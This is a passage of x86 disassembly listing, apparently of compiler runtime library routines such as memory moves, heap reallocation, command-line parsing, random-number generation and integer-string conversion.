  402402:	8b c5                	mov    %ebp,%eax
  402404:	03 c6                	add    %esi,%eax
  402406:	8b 14 24             	mov    (%esp),%edx
  402409:	e8 6e f8 ff ff       	call   0x401c7c
  40240e:	eb 3a                	jmp    0x40244a
  402410:	03 34 24             	add    (%esp),%esi
  402413:	8b dd                	mov    %ebp,%ebx
  402415:	03 de                	add    %esi,%ebx
  402417:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  40241a:	eb 2e                	jmp    0x40244a
  40241c:	8b 03                	mov    (%ebx),%eax
  40241e:	a9 00 00 00 80       	test   $0x80000000,%eax
  402423:	74 21                	je     0x402446
  402425:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40242a:	03 c3                	add    %ebx,%eax
  40242c:	8b d8                	mov    %eax,%ebx
  40242e:	8b 54 24 04          	mov    0x4(%esp),%edx
  402432:	8b c3                	mov    %ebx,%eax
  402434:	e8 cf f9 ff ff       	call   0x401e08
  402439:	84 c0                	test   %al,%al
  40243b:	74 09                	je     0x402446
  40243d:	8b dd                	mov    %ebp,%ebx
  40243f:	03 df                	add    %edi,%ebx
  402441:	e9 0d ff ff ff       	jmp    0x402353
  402446:	33 c0                	xor    %eax,%eax
  402448:	eb 19                	jmp    0x402463
  40244a:	8b c6                	mov    %esi,%eax
  40244c:	2b c7                	sub    %edi,%eax
  40244e:	01 05 a0 c5 41 00    	add    %eax,0x41c5a0
  402454:	8b 45 00             	mov    0x0(%ebp),%eax
  402457:	25 03 00 00 80       	and    $0x80000003,%eax
  40245c:	0b f0                	or     %eax,%esi
  40245e:	89 75 00             	mov    %esi,0x0(%ebp)
  402461:	b0 01                	mov    $0x1,%al
  402463:	59                   	pop    %ecx
  402464:	5a                   	pop    %edx
  402465:	5d                   	pop    %ebp
  402466:	5f                   	pop    %edi
  402467:	5e                   	pop    %esi
  402468:	5b                   	pop    %ebx
  402469:	c3                   	ret
  40246a:	8b c0                	mov    %eax,%eax
  40246c:	55                   	push   %ebp
  40246d:	8b ec                	mov    %esp,%ebp
  40246f:	51                   	push   %ecx
  402470:	53                   	push   %ebx
  402471:	56                   	push   %esi
  402472:	57                   	push   %edi
  402473:	8b f2                	mov    %edx,%esi
  402475:	8b d8                	mov    %eax,%ebx
  402477:	80 3d ac c5 41 00 00 	cmpb   $0x0,0x41c5ac
  40247e:	75 13                	jne    0x402493
  402480:	e8 eb f3 ff ff       	call   0x401870
  402485:	84 c0                	test   %al,%al
  402487:	75 0a                	jne    0x402493
  402489:	33 c0                	xor    %eax,%eax
  40248b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40248e:	e9 91 00 00 00       	jmp    0x402524
  402493:	33 d2                	xor    %edx,%edx
  402495:	55                   	push   %ebp
  402496:	68 1d 25 40 00       	push   $0x40251d
  40249b:	64 ff 32             	push   %fs:(%edx)
  40249e:	64 89 22             	mov    %esp,%fs:(%edx)
  4024a1:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  4024a8:	74 0a                	je     0x4024b4
  4024aa:	68 b4 c5 41 00       	push   $0x41c5b4
  4024af:	e8 18 ed ff ff       	call   0x4011cc
  4024b4:	8b d6                	mov    %esi,%edx
  4024b6:	8b c3                	mov    %ebx,%eax
  4024b8:	e8 d3 fd ff ff       	call   0x402290
  4024bd:	84 c0                	test   %al,%al
  4024bf:	74 05                	je     0x4024c6
  4024c1:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4024c4:	eb 36                	jmp    0x4024fc
  4024c6:	8b c6                	mov    %esi,%eax
  4024c8:	e8 8f fa ff ff       	call   0x401f5c
  4024cd:	8b f8                	mov    %eax,%edi
  4024cf:	8b c3                	mov    %ebx,%eax
  4024d1:	83 e8 04             	sub    $0x4,%eax
  4024d4:	8b 00                	mov    (%eax),%eax
  4024d6:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4024db:	83 e8 04             	sub    $0x4,%eax
  4024de:	3b f0                	cmp    %eax,%esi
  4024e0:	7d 02                	jge    0x4024e4
  4024e2:	8b c6                	mov    %esi,%eax
  4024e4:	85 ff                	test   %edi,%edi
  4024e6:	74 11                	je     0x4024f9
  4024e8:	8b d7                	mov    %edi,%edx
  4024ea:	8b cb                	mov    %ebx,%ecx
  4024ec:	91                   	xchg   %eax,%ecx
  4024ed:	e8 36 01 00 00       	call   0x402628
  4024f2:	8b c3                	mov    %ebx,%eax
  4024f4:	e8 f3 fb ff ff       	call   0x4020ec
  4024f9:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4024fc:	33 c0                	xor    %eax,%eax
  4024fe:	5a                   	pop    %edx
  4024ff:	59                   	pop    %ecx
  402500:	59                   	pop    %ecx
  402501:	64 89 10             	mov    %edx,%fs:(%eax)
  402504:	68 24 25 40 00       	push   $0x402524
  402509:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  402510:	74 0a                	je     0x40251c
  402512:	68 b4 c5 41 00       	push   $0x41c5b4
  402517:	e8 b8 ec ff ff       	call   0x4011d4
  40251c:	c3                   	ret
  40251d:	e9 5e 0a 00 00       	jmp    0x402f80
  402522:	eb e5                	jmp    0x402509
  402524:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402527:	5f                   	pop    %edi
  402528:	5e                   	pop    %esi
  402529:	5b                   	pop    %ebx
  40252a:	59                   	pop    %ecx
  40252b:	5d                   	pop    %ebp
  40252c:	c3                   	ret
  40252d:	8d 40 00             	lea    0x0(%eax),%eax
  402530:	53                   	push   %ebx
  402531:	85 c0                	test   %eax,%eax
  402533:	7e 15                	jle    0x40254a
  402535:	ff 15 30 b0 41 00    	call   *0x41b030
  40253b:	8b d8                	mov    %eax,%ebx
  40253d:	85 db                	test   %ebx,%ebx
  40253f:	75 0b                	jne    0x40254c
  402541:	b0 01                	mov    $0x1,%al
  402543:	e8 cc 00 00 00       	call   0x402614
  402548:	eb 02                	jmp    0x40254c
  40254a:	33 db                	xor    %ebx,%ebx
  40254c:	8b c3                	mov    %ebx,%eax
  40254e:	5b                   	pop    %ebx
  40254f:	c3                   	ret
  402550:	53                   	push   %ebx
  402551:	85 c0                	test   %eax,%eax
  402553:	74 15                	je     0x40256a
  402555:	ff 15 34 b0 41 00    	call   *0x41b034
  40255b:	8b d8                	mov    %eax,%ebx
  40255d:	85 db                	test   %ebx,%ebx
  40255f:	74 0b                	je     0x40256c
  402561:	b0 02                	mov    $0x2,%al
  402563:	e8 ac 00 00 00       	call   0x402614
  402568:	eb 02                	jmp    0x40256c
  40256a:	33 db                	xor    %ebx,%ebx
  40256c:	8b c3                	mov    %ebx,%eax
  40256e:	5b                   	pop    %ebx
  40256f:	c3                   	ret
  402570:	8b 08                	mov    (%eax),%ecx
  402572:	85 c9                	test   %ecx,%ecx
  402574:	74 32                	je     0x4025a8
  402576:	85 d2                	test   %edx,%edx
  402578:	74 18                	je     0x402592
  40257a:	50                   	push   %eax
  40257b:	89 c8                	mov    %ecx,%eax
  40257d:	ff 15 38 b0 41 00    	call   *0x41b038
  402583:	59                   	pop    %ecx
  402584:	09 c0                	or     %eax,%eax
  402586:	74 19                	je     0x4025a1
  402588:	89 01                	mov    %eax,(%ecx)
  40258a:	c3                   	ret
  40258b:	b0 02                	mov    $0x2,%al
  40258d:	e9 82 00 00 00       	jmp    0x402614
  402592:	89 10                	mov    %edx,(%eax)
  402594:	89 c8                	mov    %ecx,%eax
  402596:	ff 15 34 b0 41 00    	call   *0x41b034
  40259c:	09 c0                	or     %eax,%eax
  40259e:	75 eb                	jne    0x40258b
  4025a0:	c3                   	ret
  4025a1:	b0 01                	mov    $0x1,%al
  4025a3:	e9 6c 00 00 00       	jmp    0x402614
  4025a8:	85 d2                	test   %edx,%edx
  4025aa:	74 10                	je     0x4025bc
  4025ac:	50                   	push   %eax
  4025ad:	89 d0                	mov    %edx,%eax
  4025af:	ff 15 30 b0 41 00    	call   *0x41b030
  4025b5:	59                   	pop    %ecx
  4025b6:	09 c0                	or     %eax,%eax
  4025b8:	74 e7                	je     0x4025a1
  4025ba:	89 01                	mov    %eax,(%ecx)
  4025bc:	c3                   	ret
  4025bd:	8d 40 00             	lea    0x0(%eax),%eax
  4025c0:	89 15 04 b0 41 00    	mov    %edx,0x41b004
  4025c6:	e8 01 0f 00 00       	call   0x4034cc
  4025cb:	c3                   	ret
  4025cc:	53                   	push   %ebx
  4025cd:	56                   	push   %esi
  4025ce:	8b f2                	mov    %edx,%esi
  4025d0:	8b d8                	mov    %eax,%ebx
  4025d2:	80 e3 7f             	and    $0x7f,%bl
  4025d5:	83 3d 08 c0 41 00 00 	cmpl   $0x0,0x41c008
  4025dc:	74 0a                	je     0x4025e8
  4025de:	8b d6                	mov    %esi,%edx
  4025e0:	8b c3                	mov    %ebx,%eax
  4025e2:	ff 15 08 c0 41 00    	call   *0x41c008
  4025e8:	84 db                	test   %bl,%bl
  4025ea:	75 08                	jne    0x4025f4
  4025ec:	8a 1d 24 c6 41 00    	mov    0x41c624,%bl
  4025f2:	eb 0f                	jmp    0x402603
  4025f4:	80 fb 18             	cmp    $0x18,%bl
  4025f7:	77 0a                	ja     0x402603
  4025f9:	33 c0                	xor    %eax,%eax
  4025fb:	8a c3                	mov    %bl,%al
  4025fd:	8a 98 3c b0 41 00    	mov    0x41b03c(%eax),%bl
  402603:	33 c0                	xor    %eax,%eax
  402605:	8a c3                	mov    %bl,%al
  402607:	8b d6                	mov    %esi,%edx
  402609:	e8 b2 ff ff ff       	call   0x4025c0
  40260e:	5e                   	pop    %esi
  40260f:	5b                   	pop    %ebx
  402610:	c3                   	ret
  402611:	8d 40 00             	lea    0x0(%eax),%eax
  402614:	83 e0 7f             	and    $0x7f,%eax
  402617:	8b 14 24             	mov    (%esp),%edx
  40261a:	e9 ad ff ff ff       	jmp    0x4025cc
  40261f:	c3                   	ret
  402620:	a3 24 c6 41 00       	mov    %eax,0x41c624
  402625:	c3                   	ret
  402626:	8b c0                	mov    %eax,%eax
  402628:	56                   	push   %esi
  402629:	57                   	push   %edi
  40262a:	89 c6                	mov    %eax,%esi
  40262c:	89 d7                	mov    %edx,%edi
  40262e:	89 c8                	mov    %ecx,%eax
  402630:	39 f7                	cmp    %esi,%edi
  402632:	77 13                	ja     0x402647
  402634:	74 2f                	je     0x402665
  402636:	c1 f9 02             	sar    $0x2,%ecx
  402639:	78 2a                	js     0x402665
  40263b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40263d:	89 c1                	mov    %eax,%ecx
  40263f:	83 e1 03             	and    $0x3,%ecx
  402642:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402644:	5f                   	pop    %edi
  402645:	5e                   	pop    %esi
  402646:	c3                   	ret
  402647:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  40264b:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  40264f:	c1 f9 02             	sar    $0x2,%ecx
  402652:	78 11                	js     0x402665
  402654:	fd                   	std
  402655:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402657:	89 c1                	mov    %eax,%ecx
  402659:	83 e1 03             	and    $0x3,%ecx
  40265c:	83 c6 03             	add    $0x3,%esi
  40265f:	83 c7 03             	add    $0x3,%edi
  402662:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402664:	fc                   	cld
  402665:	5f                   	pop    %edi
  402666:	5e                   	pop    %esi
  402667:	c3                   	ret
  402668:	53                   	push   %ebx
  402669:	56                   	push   %esi
  40266a:	57                   	push   %edi
  40266b:	55                   	push   %ebp
  40266c:	8b f2                	mov    %edx,%esi
  40266e:	8b d8                	mov    %eax,%ebx
  402670:	eb 08                	jmp    0x40267a
  402672:	53                   	push   %ebx
  402673:	e8 60 ea ff ff       	call   0x4010d8
  402678:	8b d8                	mov    %eax,%ebx
  40267a:	8a 03                	mov    (%ebx),%al
  40267c:	84 c0                	test   %al,%al
  40267e:	74 04                	je     0x402684
  402680:	3c 20                	cmp    $0x20,%al
  402682:	76 ee                	jbe    0x402672
  402684:	80 3b 22             	cmpb   $0x22,(%ebx)
  402687:	75 0b                	jne    0x402694
  402689:	80 7b 01 22          	cmpb   $0x22,0x1(%ebx)
  40268d:	75 05                	jne    0x402694
  40268f:	83 c3 02             	add    $0x2,%ebx
  402692:	eb e6                	jmp    0x40267a
  402694:	33 ed                	xor    %ebp,%ebp
  402696:	8b fb                	mov    %ebx,%edi
  402698:	eb 43                	jmp    0x4026dd
  40269a:	3c 22                	cmp    $0x22,%al
  40269c:	75 31                	jne    0x4026cf
  40269e:	53                   	push   %ebx
  40269f:	e8 34 ea ff ff       	call   0x4010d8
  4026a4:	8b d8                	mov    %eax,%ebx
  4026a6:	eb 0e                	jmp    0x4026b6
  4026a8:	53                   	push   %ebx
  4026a9:	e8 2a ea ff ff       	call   0x4010d8
  4026ae:	8b d0                	mov    %eax,%edx
  4026b0:	2b d3                	sub    %ebx,%edx
  4026b2:	03 ea                	add    %edx,%ebp
  4026b4:	8b d8                	mov    %eax,%ebx
  4026b6:	8a 03                	mov    (%ebx),%al
  4026b8:	84 c0                	test   %al,%al
  4026ba:	74 04                	je     0x4026c0
  4026bc:	3c 22                	cmp    $0x22,%al
  4026be:	75 e8                	jne    0x4026a8
  4026c0:	80 3b 00             	cmpb   $0x0,(%ebx)
  4026c3:	74 18                	je     0x4026dd
  4026c5:	53                   	push   %ebx
  4026c6:	e8 0d ea ff ff       	call   0x4010d8
  4026cb:	8b d8                	mov    %eax,%ebx
  4026cd:	eb 0e                	jmp    0x4026dd
  4026cf:	53                   	push   %ebx
  4026d0:	e8 03 ea ff ff       	call   0x4010d8
  4026d5:	8b d0                	mov    %eax,%edx
  4026d7:	2b d3                	sub    %ebx,%edx
  4026d9:	03 ea                	add    %edx,%ebp
  4026db:	8b d8                	mov    %eax,%ebx
  4026dd:	8a 03                	mov    (%ebx),%al
  4026df:	3c 20                	cmp    $0x20,%al
  4026e1:	77 b7                	ja     0x40269a
  4026e3:	8b c6                	mov    %esi,%eax
  4026e5:	8b d5                	mov    %ebp,%edx
  4026e7:	e8 d4 13 00 00       	call   0x403ac0
  4026ec:	8b df                	mov    %edi,%ebx
  4026ee:	8b 3e                	mov    (%esi),%edi
  4026f0:	33 f6                	xor    %esi,%esi
  4026f2:	eb 51                	jmp    0x402745
  4026f4:	3c 22                	cmp    $0x22,%al
  4026f6:	75 38                	jne    0x402730
  4026f8:	53                   	push   %ebx
  4026f9:	e8 da e9 ff ff       	call   0x4010d8
  4026fe:	8b d8                	mov    %eax,%ebx
  402700:	eb 15                	jmp    0x402717
  402702:	53                   	push   %ebx
  402703:	e8 d0 e9 ff ff       	call   0x4010d8
  402708:	3b c3                	cmp    %ebx,%eax
  40270a:	76 0b                	jbe    0x402717
  40270c:	8a 13                	mov    (%ebx),%dl
  40270e:	88 14 37             	mov    %dl,(%edi,%esi,1)
  402711:	43                   	inc    %ebx
  402712:	46                   	inc    %esi
  402713:	3b c3                	cmp    %ebx,%eax
  402715:	77 f5                	ja     0x40270c
  402717:	8a 03                	mov    (%ebx),%al
  402719:	84 c0                	test   %al,%al
  40271b:	74 04                	je     0x402721
  40271d:	3c 22                	cmp    $0x22,%al
  40271f:	75 e1                	jne    0x402702
  402721:	80 3b 00             	cmpb   $0x0,(%ebx)
  402724:	74 1f                	je     0x402745
  402726:	53                   	push   %ebx
  402727:	e8 ac e9 ff ff       	call   0x4010d8
  40272c:	8b d8                	mov    %eax,%ebx
  40272e:	eb 15                	jmp    0x402745
  402730:	53                   	push   %ebx
  402731:	e8 a2 e9 ff ff       	call   0x4010d8
  402736:	3b c3                	cmp    %ebx,%eax
  402738:	76 0b                	jbe    0x402745
  40273a:	8a 13                	mov    (%ebx),%dl
  40273c:	88 14 37             	mov    %dl,(%edi,%esi,1)
  40273f:	43                   	inc    %ebx
  402740:	46                   	inc    %esi
  402741:	3b c3                	cmp    %ebx,%eax
  402743:	77 f5                	ja     0x40273a
  402745:	8a 03                	mov    (%ebx),%al
  402747:	3c 20                	cmp    $0x20,%al
  402749:	77 a9                	ja     0x4026f4
  40274b:	8b c3                	mov    %ebx,%eax
  40274d:	5d                   	pop    %ebp
  40274e:	5f                   	pop    %edi
  40274f:	5e                   	pop    %esi
  402750:	5b                   	pop    %ebx
  402751:	c3                   	ret
  402752:	8b c0                	mov    %eax,%eax
  402754:	53                   	push   %ebx
  402755:	56                   	push   %esi
  402756:	57                   	push   %edi
  402757:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  40275d:	8b da                	mov    %edx,%ebx
  40275f:	8b f0                	mov    %eax,%esi
  402761:	8b c3                	mov    %ebx,%eax
  402763:	e8 7c 0d 00 00       	call   0x4034e4
  402768:	85 f6                	test   %esi,%esi
  40276a:	75 1e                	jne    0x40278a
  40276c:	68 05 01 00 00       	push   $0x105
  402771:	8d 44 24 04          	lea    0x4(%esp),%eax
  402775:	50                   	push   %eax
  402776:	6a 00                	push   $0x0
  402778:	e8 8b e9 ff ff       	call   0x401108
  40277d:	8b c8                	mov    %eax,%ecx
  40277f:	8b d4                	mov    %esp,%edx
  402781:	8b c3                	mov    %ebx,%eax
  402783:	e8 4c 0e 00 00       	call   0x4035d4
  402788:	eb 1e                	jmp    0x4027a8
  40278a:	e8 69 e9 ff ff       	call   0x4010f8
  40278f:	8b f8                	mov    %eax,%edi
  402791:	8b d3                	mov    %ebx,%edx
  402793:	8b c7                	mov    %edi,%eax
  402795:	e8 ce fe ff ff       	call   0x402668
  40279a:	8b f8                	mov    %eax,%edi
  40279c:	85 f6                	test   %esi,%esi
  40279e:	74 08                	je     0x4027a8
  4027a0:	83 3b 00             	cmpl   $0x0,(%ebx)
  4027a3:	74 03                	je     0x4027a8
  4027a5:	4e                   	dec    %esi
  4027a6:	eb e9                	jmp    0x402791
  4027a8:	81 c4 08 01 00 00    	add    $0x108,%esp
  4027ae:	5f                   	pop    %edi
  4027af:	5e                   	pop    %esi
  4027b0:	5b                   	pop    %ebx
  4027b1:	c3                   	ret
  4027b2:	8b c0                	mov    %eax,%eax
  4027b4:	83 c4 f8             	add    $0xfffffff8,%esp
  4027b7:	54                   	push   %esp
  4027b8:	e8 b3 e9 ff ff       	call   0x401170
  4027bd:	85 c0                	test   %eax,%eax
  4027bf:	74 0b                	je     0x4027cc
  4027c1:	8b 04 24             	mov    (%esp),%eax
  4027c4:	a3 08 b0 41 00       	mov    %eax,0x41b008
  4027c9:	59                   	pop    %ecx
  4027ca:	5a                   	pop    %edx
  4027cb:	c3                   	ret
  4027cc:	e8 a7 e9 ff ff       	call   0x401178
  4027d1:	a3 08 b0 41 00       	mov    %eax,0x41b008
  4027d6:	59                   	pop    %ecx
  4027d7:	5a                   	pop    %edx
  4027d8:	c3                   	ret
  4027d9:	8d 40 00             	lea    0x0(%eax),%eax
  4027dc:	53                   	push   %ebx
  4027dd:	56                   	push   %esi
  4027de:	8b d8                	mov    %eax,%ebx
  4027e0:	33 f6                	xor    %esi,%esi
  4027e2:	66 8b 43 04          	mov    0x4(%ebx),%ax
  4027e6:	66 3d b1 d7          	cmp    $0xd7b1,%ax
  4027ea:	72 2f                	jb     0x40281b
  4027ec:	66 3d b3 d7          	cmp    $0xd7b3,%ax
  4027f0:	77 29                	ja     0x40281b
  4027f2:	66 25 b2 d7          	and    $0xd7b2,%ax
  4027f6:	66 3d b2 d7          	cmp    $0xd7b2,%ax
  4027fa:	75 07                	jne    0x402803
  4027fc:	8b c3                	mov    %ebx,%eax
  4027fe:	ff 53 1c             	call   *0x1c(%ebx)
  402801:	8b f0                	mov    %eax,%esi
  402803:	85 f6                	test   %esi,%esi
  402805:	75 07                	jne    0x40280e
  402807:	8b c3                	mov    %ebx,%eax
  402809:	ff 53 24             	call   *0x24(%ebx)
  40280c:	8b f0                	mov    %eax,%esi
  40280e:	85 f6                	test   %esi,%esi
  402810:	74 1b                	je     0x40282d
  402812:	8b c6                	mov    %esi,%eax
  402814:	e8 07 fe ff ff       	call   0x402620
  402819:	eb 12                	jmp    0x40282d
  40281b:	81 fb 38 c0 41 00    	cmp    $0x41c038,%ebx
  402821:	74 0a                	je     0x40282d
  402823:	b8 67 00 00 00       	mov    $0x67,%eax
  402828:	e8 f3 fd ff ff       	call   0x402620
  40282d:	8b c6                	mov    %esi,%eax
  40282f:	5e                   	pop    %esi
  402830:	5b                   	pop    %ebx
  402831:	c3                   	ret
  402832:	8b c0                	mov    %eax,%eax
  402834:	56                   	push   %esi
  402835:	57                   	push   %edi
  402836:	89 c7                	mov    %eax,%edi
  402838:	31 c0                	xor    %eax,%eax
  40283a:	8a 07                	mov    (%edi),%al
  40283c:	89 d6                	mov    %edx,%esi
  40283e:	31 d2                	xor    %edx,%edx
  402840:	8a 16                	mov    (%esi),%dl
  402842:	46                   	inc    %esi
  402843:	00 d0                	add    %dl,%al
  402845:	72 12                	jb     0x402859
  402847:	38 c8                	cmp    %cl,%al
  402849:	77 0e                	ja     0x402859
  40284b:	89 d1                	mov    %edx,%ecx
  40284d:	8a 17                	mov    (%edi),%dl
  40284f:	88 07                	mov    %al,(%edi)
  402851:	47                   	inc    %edi
  402852:	01 d7                	add    %edx,%edi
  402854:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402856:	5f                   	pop    %edi
  402857:	5e                   	pop    %esi
  402858:	c3                   	ret
  402859:	88 c8                	mov    %cl,%al
  40285b:	2a 0f                	sub    (%edi),%cl
  40285d:	76 f7                	jbe    0x402856
  40285f:	88 ca                	mov    %cl,%dl
  402861:	eb e8                	jmp    0x40284b
  402863:	c3                   	ret
  402864:	33 c9                	xor    %ecx,%ecx
  402866:	8a 0a                	mov    (%edx),%cl
  402868:	41                   	inc    %ecx
  402869:	92                   	xchg   %eax,%edx
  40286a:	e8 b9 fd ff ff       	call   0x402628
  40286f:	c3                   	ret
  402870:	53                   	push   %ebx
  402871:	56                   	push   %esi
  402872:	51                   	push   %ecx
  402873:	89 ce                	mov    %ecx,%esi
  402875:	c1 ee 02             	shr    $0x2,%esi
  402878:	74 26                	je     0x4028a0
  40287a:	8b 08                	mov    (%eax),%ecx
  40287c:	8b 1a                	mov    (%edx),%ebx
  40287e:	39 d9                	cmp    %ebx,%ecx
  402880:	75 45                	jne    0x4028c7
  402882:	4e                   	dec    %esi
  402883:	74 15                	je     0x40289a
  402885:	8b 48 04             	mov    0x4(%eax),%ecx
  402888:	8b 5a 04             	mov    0x4(%edx),%ebx
  40288b:	39 d9                	cmp    %ebx,%ecx
  40288d:	75 38                	jne    0x4028c7
  40288f:	83 c0 08             	add    $0x8,%eax
  402892:	83 c2 08             	add    $0x8,%edx
  402895:	4e                   	dec    %esi
  402896:	75 e2                	jne    0x40287a
  402898:	eb 06                	jmp    0x4028a0
  40289a:	83 c0 04             	add    $0x4,%eax
  40289d:	83 c2 04             	add    $0x4,%edx
  4028a0:	5e                   	pop    %esi
  4028a1:	83 e6 03             	and    $0x3,%esi
  4028a4:	74 36                	je     0x4028dc
  4028a6:	8a 08                	mov    (%eax),%cl
  4028a8:	3a 0a                	cmp    (%edx),%cl
  4028aa:	75 30                	jne    0x4028dc
  4028ac:	4e                   	dec    %esi
  4028ad:	74 13                	je     0x4028c2
  4028af:	8a 48 01             	mov    0x1(%eax),%cl
  4028b2:	3a 4a 01             	cmp    0x1(%edx),%cl
  4028b5:	75 25                	jne    0x4028dc
  4028b7:	4e                   	dec    %esi
  4028b8:	74 08                	je     0x4028c2
  4028ba:	8a 48 02             	mov    0x2(%eax),%cl
  4028bd:	3a 4a 02             	cmp    0x2(%edx),%cl
  4028c0:	75 1a                	jne    0x4028dc
  4028c2:	31 c0                	xor    %eax,%eax
  4028c4:	5e                   	pop    %esi
  4028c5:	5b                   	pop    %ebx
  4028c6:	c3                   	ret
  4028c7:	5e                   	pop    %esi
  4028c8:	38 d9                	cmp    %bl,%cl
  4028ca:	75 10                	jne    0x4028dc
  4028cc:	38 fd                	cmp    %bh,%ch
  4028ce:	75 0c                	jne    0x4028dc
  4028d0:	c1 e9 10             	shr    $0x10,%ecx
  4028d3:	c1 eb 10             	shr    $0x10,%ebx
  4028d6:	38 d9                	cmp    %bl,%cl
  4028d8:	75 02                	jne    0x4028dc
  4028da:	38 fd                	cmp    %bh,%ch
  4028dc:	5e                   	pop    %esi
  4028dd:	5b                   	pop    %ebx
  4028de:	c3                   	ret
  4028df:	90                   	nop
  4028e0:	57                   	push   %edi
  4028e1:	89 c7                	mov    %eax,%edi
  4028e3:	88 cd                	mov    %cl,%ch
  4028e5:	89 c8                	mov    %ecx,%eax
  4028e7:	c1 e0 10             	shl    $0x10,%eax
  4028ea:	66 89 c8             	mov    %cx,%ax
  4028ed:	89 d1                	mov    %edx,%ecx
  4028ef:	c1 f9 02             	sar    $0x2,%ecx
  4028f2:	78 09                	js     0x4028fd
  4028f4:	f3 ab                	rep stos %eax,%es:(%edi)
  4028f6:	89 d1                	mov    %edx,%ecx
  4028f8:	83 e1 03             	and    $0x3,%ecx
  4028fb:	f3 aa                	rep stos %al,%es:(%edi)
  4028fd:	5f                   	pop    %edi
  4028fe:	c3                   	ret
  4028ff:	90                   	nop
  402900:	53                   	push   %ebx
  402901:	31 db                	xor    %ebx,%ebx
  402903:	69 93 08 b0 41 00 05 	imul   $0x8088405,0x41b008(%ebx),%edx
  40290a:	84 08 08 
  40290d:	42                   	inc    %edx
  40290e:	89 93 08 b0 41 00    	mov    %edx,0x41b008(%ebx)
  402914:	f7 e2                	mul    %edx
  402916:	89 d0                	mov    %edx,%eax
  402918:	5b                   	pop    %ebx
  402919:	c3                   	ret
  40291a:	8b c0                	mov    %eax,%eax
  40291c:	53                   	push   %ebx
  40291d:	56                   	push   %esi
  40291e:	57                   	push   %edi
  40291f:	52                   	push   %edx
  402920:	83 ec 14             	sub    $0x14,%esp
  402923:	89 cf                	mov    %ecx,%edi
  402925:	89 c6                	mov    %eax,%esi
  402927:	99                   	cltd
  402928:	31 d0                	xor    %edx,%eax
  40292a:	29 d0                	sub    %edx,%eax
  40292c:	b9 0a 00 00 00       	mov    $0xa,%ecx
  402931:	31 db                	xor    %ebx,%ebx
  402933:	31 d2                	xor    %edx,%edx
  402935:	f7 f1                	div    %ecx
  402937:	83 c2 30             	add    $0x30,%edx
  40293a:	88 14 1c             	mov    %dl,(%esp,%ebx,1)
  40293d:	43                   	inc    %ebx
  40293e:	85 c0                	test   %eax,%eax
  402940:	75 f1                	jne    0x402933
  402942:	85 f6                	test   %esi,%esi
  402944:	7d 05                	jge    0x40294b
  402946:	c6 04 1c 2d          	movb   $0x2d,(%esp,%ebx,1)
  40294a:	43                   	inc    %ebx
  40294b:	88 1f                	mov    %bl,(%edi)
  40294d:	47                   	inc    %edi
  40294e:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402952:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  402958:	7e 05                	jle    0x40295f
  40295a:	b9 ff 00 00 00       	mov    $0xff,%ecx
  40295f:	29 d9                	sub    %ebx,%ecx
  402961:	7e 07                	jle    0x40296a
  402963:	00 4f ff             	add    %cl,-0x1(%edi)
  402966:	b0 20                	mov    $0x20,%al
  402968:	f3 aa                	rep stos %al,%es:(%edi)
  40296a:	8a 44 1c ff          	mov    -0x1(%esp,%ebx,1),%al
  40296e:	88 07                	mov    %al,(%edi)
  402970:	47                   	inc    %edi
  402971:	4b                   	dec    %ebx
  402972:	75 f6                	jne    0x40296a
  402974:	83 c4 18             	add    $0x18,%esp
  402977:	5f                   	pop    %edi
  402978:	5e                   	pop    %esi
  402979:	5b                   	pop    %ebx
  40297a:	c3                   	ret
  40297b:	90                   	nop
  40297c:	8b ca                	mov    %edx,%ecx
  40297e:	33 d2                	xor    %edx,%edx
  402980:	e8 97 ff ff ff       	call   0x40291c
  402985:	c3                   	ret
  402986:	8b c0                	mov    %eax,%eax
  402988:	53                   	push   %ebx
  402989:	56                   	push   %esi
  40298a:	57                   	push   %edi
  40298b:	89 c6                	mov    %eax,%esi
  40298d:	50                   	push   %eax
  40298e:	85 c0                	test   %eax,%eax
  402990:	74 6c                	je     0x4029fe
  402992:	31 c0                	xor    %eax,%eax
  402994:	31 db                	xor    %ebx,%ebx
  402996:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  40299b:	8a 1e                	mov    (%esi),%bl
  40299d:	46                   	inc    %esi
  40299e:	80 fb 20             	cmp    $0x20,%bl
  4029a1:	74 f8                	je     0x40299b
  4029a3:	b5 00                	mov    $0x0,%ch
  4029a5:	80 fb 2d             	cmp    $0x2d,%bl
  4029a8:	74 62                	je     0x402a0c
  4029aa:	80 fb 2b             	cmp    $0x2b,%bl
  4029ad:	74 5f                	je     0x402a0e
  4029af:	80 fb 24             	cmp    $0x24,%bl
  4029b2:	74 5f                	je     0x402a13
  4029b4:	80 fb 78             	cmp    $0x78,%bl
  4029b7:	74 5a                	je     0x402a13
  4029b9:	80 fb 58             	cmp    $0x58,%bl
  4029bc:	74 55                	je     0x402a13
  4029be:	80 fb 30             	cmp    $0x30,%bl
  4029c1:	75 13                	jne    0x4029d6
  4029c3:	8a 1e                	mov    (%esi),%bl
  4029c5:	46                   	inc    %esi
  4029c6:	80 fb 78             	cmp    $0x78,%bl
  4029c9:	74 48                	je     0x402a13
  4029cb:	80 fb 58             	cmp    $0x58,%bl
  4029ce:	74 43                	je     0x402a13
  4029d0:	84 db                	test   %bl,%bl
  4029d2:	74 20                	je     0x4029f4
  4029d4:	eb 04                	jmp    0x4029da
  4029d6:	84 db                	test   %bl,%bl
  4029d8:	74 2d                	je     0x402a07
  4029da:	80 eb 30             	sub    $0x30,%bl
  4029dd:	80 fb 09             	cmp    $0x9,%bl
  4029e0:	77 25                	ja     0x402a07
  4029e2:	39 f8                	cmp    %edi,%eax
